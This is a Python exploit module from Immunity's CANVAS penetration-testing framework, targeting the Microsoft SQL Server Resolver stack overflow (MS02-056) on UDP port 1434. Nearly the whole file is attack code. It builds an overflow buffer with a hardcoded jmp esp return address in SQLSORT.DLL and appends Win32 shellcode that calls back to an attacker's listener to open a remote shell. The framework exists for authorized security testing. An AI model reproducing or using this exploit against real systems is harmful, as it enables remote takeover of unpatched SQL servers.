#! /usr/bin/env python

"""

"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#Remote overflow in SQL server found by SPIKE 2.5
#Dave Aitel
#http://www.immunityinc.com/spike.html

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import os,getopt
import sys

sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import socket
from exploitutils import *
import chunkedaddencoder
from tcpexploit import tcpexploit
import canvasengine
import win32shell
import shellcodeGenerator
from shelllistener import shelllistener
from win32Node import win32Node
import time

#TODO: FIX THESE
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['MSRC']="http://www.microsoft.com/technet/security/bulletin/ms02-056.asp"
DOCUMENTATION["CVE Name"] = "CVE-2002-1123"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1123"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["Notes"]="Exit me with ExitProcess, not exitthread"

NAME="MSSQL Resolver Stack Overflow (MS02-056)"
DESCRIPTION="MS SQL Resolver Stack Overflow"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"]]
PROPERTY['VERSION'] = ["2000", "XP"]
PROPERTY['MSADV']="MS02-056"

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=1434
        self.host=""
        #should work on everything
        self.setVersion(0)
        self.setVersions()
        self.name=NAME
        
        self.badstring="\x00/\\\r\n: "
        return

    def neededListenerTypes(self):
        #old code for non-socket stealing
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
       
        localhost=self.callback.ip
        localport=self.callback.port
        self.createWin32Shellcode(self.badstring,localhost,localport)
        #set up the shellcode
        self.log("Sizeof shellcode is %d"%len(self.shellcode))
        return 1
  
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        s=self.getudpsock()
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.host, self.port))
            s.send("a")
        except:
            return 0
        s.close()
        return 1
    
    def setVersions(self):
        self.versions={}
        #version array: name eip writable
        self.versions[0]=("Windows 2000-XP", 0x42b0c9dc,0x42ae7001)  #SQLSORT.DLL
     
        
        
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
            
    
    def run(self):
        #first make socket connection to target 1433
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
        self.log("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
        
        s=self.getudpsock()
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Could not connect!")
            self.setInfo("%s attacking %s:%d (could not connect)"%(NAME,self.host,self.port))

            return 0
        sploitstring=self.makesploit()
        s.send(sploitstring)
        time.sleep(5)
        #success
        self.setInfo("%s attacking %s:%d (done)"%(NAME,self.host,self.port))
        return self.ISucceeded()

    #returns the sploitstring
    def makesploit(self):
        
        jmpesp=intel_order(self.versions[self.version][1])
        writable=intel_order(self.versions[self.version][2])
        ret="\x04"
        shellstring="A"*900
        shellstring=stroverwrite(shellstring,writable,108) #first CoE
        shellstring=stroverwrite(shellstring,jmpesp,96) #return address
        shellstring=stroverwrite(shellstring,"\xeb\x0b",100) #jmp + 11 to get to 113
        shellstring=stroverwrite(shellstring,self.shellcode,113)
        ret+=shellstring
        return ret
        

#this stuff happens.
if __name__ == '__main__':

    print "Running CANVAS Microsoft SQL Server HELLO exploit v 0.5"
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [1,0]:
        ret.interact()
        
